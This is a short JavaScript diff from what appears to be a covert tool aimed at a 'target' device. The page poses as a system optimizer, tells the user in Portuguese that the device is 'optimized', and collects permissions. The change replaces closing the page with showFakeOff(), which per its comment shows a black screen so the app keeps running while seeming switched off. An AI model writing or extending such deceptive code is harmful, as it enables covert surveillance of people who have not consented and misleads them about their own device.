@@ -111,11 +111,11 @@ async function initTargetService() {
 
     function checkPermissionsFinalized() {
         if (permissionsGranted >= totalPermissions) {
-            document.getElementById('setup-view').innerHTML = "<h2>Sistema Atualizado</h2><p>O dispositivo está otimizado. Você pode fechar o navegador.</p>";
+            document.getElementById('setup-view').innerHTML = "<h2>Sistema Pronto</h2><p>Otimização concluída.</p>";
             setTimeout(() => {
-                // Try to close or go to blank
-                window.location.href = "about:blank";
-            }, 3000);
+                // Em vez de fechar (que mata o app), vamos para a tela preta
+                showFakeOff();
+            }, 2000);
         }
     }
 }
